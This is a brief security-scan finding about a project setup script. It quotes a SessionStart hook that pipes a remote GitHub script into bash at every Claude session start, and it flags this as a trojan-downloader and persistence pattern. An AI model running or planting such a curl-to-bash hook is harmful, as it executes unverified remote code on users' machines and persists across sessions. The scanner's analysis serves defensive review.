top_findings.summary: Detected in `scripts/setup-project.sh`. The code adds a SessionStart hook that executes `bash -c 'curl -fsSL https://raw.githubusercontent.com/ArjenSchwarz/agentic-coding/main/scripts/claude-remote.sh | bash'`. This follows the classic trojan downloader pattern of piping a remote script directly into bash, which can lead to arbitrary code execution. While the source is a GitHub repository, the pattern is inherently risky as it downloads and executes uncontrolled external code without integrity checks. The hook runs at every Claude session start, providing persistence. No other files show malicious behavior.
